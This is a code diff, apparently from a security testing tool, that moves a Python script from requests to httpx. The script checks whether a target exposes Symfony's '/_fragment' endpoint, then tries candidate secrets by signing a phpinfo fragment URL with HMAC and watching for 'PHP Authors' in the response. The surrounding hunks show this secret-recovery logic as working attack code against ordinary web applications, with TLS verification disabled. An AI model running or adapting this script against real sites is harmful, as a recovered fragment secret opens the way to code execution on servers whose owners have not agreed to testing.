@@ -8,11 +8,8 @@ import os
 import sys
 import hashlib
 import argparse
-import requests
+import httpx
 from contextlib import suppress
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
 sys.path.append(os.path.dirname(SCRIPT_DIR))
@@ -61,9 +58,9 @@ def main():
     if not args.url:
         return
 
-    proxies = None
+    proxy = None
     if args.proxy:
-        proxies = {"http": args.proxy, "https": args.proxy}
+        proxy = args.proxy
 
     headers = {}
     if args.user_agent:
@@ -71,13 +68,13 @@ def main():
 
     fragment_test_url = f"{args.url.rstrip('/')}/_fragment"
     try:
-        res_fragment = requests.get(f"{fragment_test_url}", proxies=proxies, headers=headers, verify=False)
-    except (requests.exceptions.ConnectionError, requests.exceptions.ConnectTimeout):
+        res_fragment = httpx.get(f"{fragment_test_url}", proxy=proxy, headers=headers, verify=False, follow_redirects=True)
+    except (httpx.ConnectError, httpx.ConnectTimeout):
         print(f"Error connecting to URL: [{args.url}]")
         return
 
     negative_test_url = f"{args.url.rstrip('/')}/AAAAAAAA"
-    res_random = requests.get(f"{negative_test_url}", proxies=proxies, headers=headers, verify=False)
+    res_random = httpx.get(f"{negative_test_url}", proxy=proxy, headers=headers, verify=False, follow_redirects=True)
 
     if (res_fragment.status_code != 403) or not (res_random.status_code != res_fragment.status_code):
         print(f"Not a Symfony app, or _fragment functionality not enabled...")
@@ -95,7 +92,7 @@ def main():
             for hash_algorithm in [hashlib.sha256, hashlib.sha1]:
                 hash_value = x.symfonyHMAC(phpinfo_test_url, secret, hash_algorithm)
                 test_url = f"{phpinfo_test_url}&_hash={hash_value.decode()}"
-                test_res = requests.get(f"{test_url}", proxies=proxies, headers=headers, verify=False)
+                test_res = httpx.get(f"{test_url}", proxy=proxy, headers=headers, verify=False, follow_redirects=True)
                 if "PHP Authors" in test_res.text:
                     print(test_url)
                     print(f"Found Symfony Secret! [{secret}]")
